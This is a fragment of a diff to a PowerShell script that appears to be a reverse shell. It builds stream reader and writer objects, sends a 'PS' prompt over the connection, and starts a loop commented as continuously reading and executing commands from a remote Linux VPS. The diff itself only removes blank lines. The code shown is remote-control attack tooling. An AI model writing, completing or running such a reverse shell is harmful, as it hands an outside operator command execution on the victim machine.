@@ -4,11 +4,9 @@ $writer = new-object System.IO.StreamWriter($stream);
 $reader = new-object System.IO.StreamReader($stream);
 $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
-
 # Send an initial prompt
 $writer.Write($encoding.GetBytes("PS " + (pwd).Path + "> "));
 $writer.Flush();
-
 # Continuously read and execute commands from the Linux VPS
 while($true) {
     try {
